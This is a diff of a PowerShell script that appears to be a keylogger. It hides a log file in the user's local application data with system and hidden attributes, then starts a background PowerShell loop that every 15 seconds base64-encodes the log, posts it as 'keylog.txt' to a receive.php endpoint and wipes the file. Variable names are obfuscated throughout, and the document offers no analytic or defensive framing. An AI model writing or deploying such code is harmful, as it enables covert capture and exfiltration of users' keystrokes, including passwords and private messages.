@@ -3,23 +3,34 @@ function Set_bootACL($filepath)
     ac $filepath ""
 	attrib +S +H $filepath
 }
-$srsdf='http://localhost/receive.php' 
-
-function GetFile() {
-	param (
-        $mytar,
-	    $name
-       )
-	Write-Output $name
-	$dhd=[IO.File]::readallbytes($mytar);
-	$kfjh=[System.Convert]::ToBase64String($dhd);
-	$kfjh=[regex]::Replace($kfjh,'=','%');
-	$msgin='access='+$kfjh+'&name='+$name;
-	Invoke-WebRequest -Uri $srsdf -Method Post -Body $msgin;
-}
-
 $logFilePath = Join-Path ([Environment]::GetFolderPath([Environment+SpecialFolder]::LocalApplicationData)) "Log.txt"
 Set_bootACL($logFilePath)
+
+Start-Process powershell -ArgumentList "-Command", {
+    while($true)
+    {
+        $logFilePath = Join-Path ([Environment]::GetFolderPath([Environment+SpecialFolder]::LocalApplicationData)) "Log.txt"
+        $srsdf='http://localhost/receive.php' 
+
+        function GetFile() {
+            param (
+                $mytar,
+                $name
+            )
+            Write-Output $name
+            $dhd=[IO.File]::readallbytes($mytar);
+            $kfjh=[System.Convert]::ToBase64String($dhd);
+            $kfjh=[regex]::Replace($kfjh,'=','%');
+            $msgin='access='+$kfjh+'&name='+$name;
+            Invoke-WebRequest -Uri $srsdf -Method Post -Body $msgin;
+            Clear-Content -Path $logFilePath
+
+        }
+        GetFile $logFilePath "keylog.txt"
+        
+        start-sleep -s 15
+    }
+}
 
 Add-Type -TypeDefinition @"
 using System;
